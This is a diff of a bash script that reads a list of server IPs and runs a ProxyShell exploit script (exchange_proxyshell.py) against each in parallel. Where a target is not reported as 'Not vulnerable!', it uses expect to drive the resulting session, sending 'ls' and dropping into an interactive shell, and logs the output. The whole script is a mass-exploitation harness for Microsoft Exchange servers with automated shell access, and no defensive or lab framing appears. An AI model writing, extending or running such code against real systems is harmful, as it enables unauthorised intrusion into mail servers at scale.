@@ -31,24 +31,29 @@ fi
 
 log_file="${servers_file%.txt}_log.txt"  # Creating the log file name
 
-# Read IP addresses from the file and iterate
-while IFS= read -r ip; do
-    (
+# Function to execute the Python script
+execute_python_script() {
+    local ip=$1
+    local output=$(python3 exchange_proxyshell.py -u https://$ip 2>&1)
+    
+    echo "IP: $ip"
+    if [ "$output" != "Not vulnerable!" ]; then
         if [ "$debug" = true ]; then
-            python3 exchange_proxyshell.py -u "https://$ip"
+            echo "$output"
         else
-            output=$(expect -c "
+            expect -c "
                 spawn python3 exchange_proxyshell.py -u https://$ip
                 expect -re \".*\" { send \"\r\"; exp_continue }
                 expect -re \".*\" { send \"ls\n\"; exp_continue }
                 interact
-            " 2>&1)
-            echo "$output" >> "$log_file"  # Append Python output to the log file
+            " | tee -a "$log_file"
         fi
-        echo "IP: $ip"
-    ) | tee -a "$log_file"
-    
-    # Store the PID of the background process
+    fi
+}
+
+# Read IP addresses from the file and iterate
+while IFS= read -r ip; do
+    execute_python_script "$ip" &
     PIDS+=($!)
     
     # If the number of PIDs is greater or equal to MAX_PARALLEL, wait for them to finish
